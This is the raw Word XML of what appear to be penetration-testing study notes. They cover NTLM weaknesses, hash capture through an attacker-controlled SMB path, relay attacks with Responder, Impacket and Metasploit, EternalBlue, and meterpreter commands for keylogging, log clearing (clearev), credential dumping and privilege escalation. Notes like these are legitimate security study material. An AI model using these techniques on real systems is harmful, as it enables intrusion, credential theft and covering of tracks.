    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F4">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="136"/>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Auth using an IP not part of the same domain</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F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44qx8zew5a6u" w:id="124"/>
        <w:bookmarkEnd w:id="124"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F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j06egmsm0wc" w:id="125"/>
        <w:bookmarkEnd w:id="12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NTLM</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F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Challenge response - protocol</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Type 1 -- negotiation (client sends username/plaintext)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F9">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="121"/>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type 2 -- challenge (server responds. random val)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002FA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Type 3 -- authentication( client encrypts challenge hash with password and returns)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002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21bytes (5 null byte padding) → 3 blocks of 7 bytes (+ 1 parity byte) → generated by server respons</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F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2F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a6ak7lt36ew" w:id="126"/>
        <w:bookmarkEnd w:id="12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LM weaknesses / NTLMv1</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F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LM → DES encrypted</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000002F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LM and NTLM identical protocol except for hash uses in step3</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030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0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02">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nagvc0563e81" w:id="127"/>
        <w:bookmarkEnd w:id="12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Attack ntlm</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030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Impersonate the server (step 3, client hash)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030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Each part of the DES encryption of the 3 split up server response is not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related to the previous one</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030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Last DES key has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more null padding</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030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0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Method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force victim to start a connection to the fake server(attacker</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000308">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Listening smb service, accept conns, send back a fixed challenge</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000309">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 capture,smb</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030A">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challenge</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Force ntlm initiation through smb authentication</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030C">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Embed path into email or webpage( \\attackIP\etc) auths to smb listener, </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Access can be read from listener</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030E">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Last part of LM has same</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000030F">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Hashes saved to location specified</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000310">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Rcracki_mt use rainbow table</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000311">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Remaining parts of the HASH can be cracked with metasploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000312">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tools/password/rubyscript halflm_second or perl script netntlm</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000313">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="9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All uppercase result (because of the algorithm used to initially encrypt)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000314">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="93"/>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Perl script netntlm to convert</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000031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rdi96x5v944s" w:id="128"/>
        <w:bookmarkEnd w:id="128"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000031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rdi96x5v944s" w:id="128"/>
        <w:bookmarkEnd w:id="12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NTLMv2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000031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Type 3 message is generated differently </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000318">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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hmac-md5 of nt hash and username server pair</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000319">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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 are reliant on each other</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000031A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Bruteforce hmac is only option</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000031B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>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31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1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1E">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3mskcmqf6zk" w:id="129"/>
        <w:bookmarkEnd w:id="12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 Relay on NTLMv1</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000031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Skip the cracking phase, use reuse authentication attempts </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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Attacker acts like MiTM, Waits for someone to authenticate to a machine. Mitm the server and send the request to the real server, and creates a challenge to send back to the user and receives the encrypted Type 3, sends to the server and is authed as the user</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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28067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ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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has to have admin privs on target and the Target has Send LM and NTLM Responses</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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2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metasploit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smb_relay </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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Impacket smbrelayx.py</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000327">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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create meterpreter payload → then start .py</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000328">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="8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Handler to listen for connections and establish session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000329">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="83"/>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 multi, handler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="8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Payload impacket executes on target machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="83"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="216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Msfvenom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same details as metasploit options, inputted into an exe</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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t7pnean3ofl" w:id="130"/>
        <w:bookmarkEnd w:id="13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Eternal Blue</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003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Effects Microsofts, SMBv1 -- cve0170144 / MS17-010</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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Remote code execution as NT Authority\SYSTEM user</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000032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30">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7d53xobjbhr" w:id="131"/>
        <w:bookmarkEnd w:id="13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br w:type="textWrapping"/>
          <w:t xml:space="preserve">Client Side Exploitation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003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3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interaction, clicking </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033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 → firefox_pdfjs_privilege _escelation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033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3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 options</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033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Background → from the meterpreter into metasploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003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Sessions → lists sessions, use -i [id] , to get back into session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000003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 meterpreter </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000339">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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Sysinfo</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033A">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Download [C:\\user\\fi\\filepath]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033B">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[c.exe] [C:\\User\\Deskktop]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033C">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Edit [file]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033D">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Execute -f exe -i H (interactive, hidden)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033E">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Shell </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000033F">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 -f file.*</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000340">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post/windows/etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000341">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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Migrate [processid]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000342">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>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Keyscan_start , keyscan_dump, keyscan_stop, clearev</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034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4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4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4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Responser &amp; MultiRelay</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034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 name service and smb signing is disabled on endpoints</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034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Capture capture the NET NTLMv1,NTLM2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034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Create a multi relay shell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034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4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Download responder</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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 conf, turn smb and http off</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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Listen on interface -I , downgrade hash (--lm)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034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Multirelay (in responder tool, )</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000034F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Multirelay 0t [P] -u ALL (users)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000350">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>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Generate payload with msfvenom</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000351">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="5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/meterpreter reverse shell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000352">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="58"/>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exploit/multi/handler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000353">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="58"/>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payload has exploit, and lhost/port, (exploit -j)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000354">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>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multi relayshell, upload payload created</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000355">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>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Execute payload</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000035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Load kiwi, credential dumping</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000035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5E">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l4s2dw75ny0" w:id="132"/>
        <w:bookmarkEnd w:id="13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Post Exploitation </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000035F">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w0krgw9g2csk" w:id="133"/>
        <w:bookmarkEnd w:id="13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Privilege Escalation and Maintaining Access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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Vertical → lower to higher priv. User to root (nix)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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Horizontal → same privs, different identity, standard to standard</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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6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Meterpreter</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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ng90egh1eva" w:id="134"/>
        <w:bookmarkEnd w:id="13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Migrate session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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Getpid</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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post/windows/manage/migrate</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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Getpid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compare if migrated</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000368">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b2b7rz2rc7jj" w:id="135"/>
        <w:bookmarkEnd w:id="135"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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s5tv8fi8sq6" w:id="136"/>
        <w:bookmarkEnd w:id="13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Privilege Escalation </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036A">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usmyrjgy68" w:id="137"/>
        <w:bookmarkEnd w:id="13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 Esc (Windows)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036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Getsystem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(ONLY against windows)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Does Not work if UAC of vista +</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000036D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="5"/>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bypassuac</w:t>
        </w:r>
      </w:ins>
    </w:p>
